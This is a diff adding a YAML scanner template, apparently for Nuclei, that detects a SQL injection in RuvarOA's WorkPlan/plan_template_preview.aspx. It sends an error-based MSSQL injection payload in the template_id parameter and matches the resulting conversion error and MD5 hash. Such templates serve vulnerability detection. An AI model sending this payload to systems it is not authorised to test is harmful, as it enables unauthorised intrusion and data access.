@@ -1,0 +1,27 @@
+id: poc-yaml-ruvaroa-plan-template-preview-sqli
+info:
+  name: RuvarOA plan_template_preview SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: ruvar-oa
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/WorkPlan/plan_template_preview.aspx?template_id=%28-1%29+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+%29"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "[Exception]:"
+          - "转换成数据类型 int 时失败"
+      - type: regex
+        regex:
+          - "0x{{t2}}"
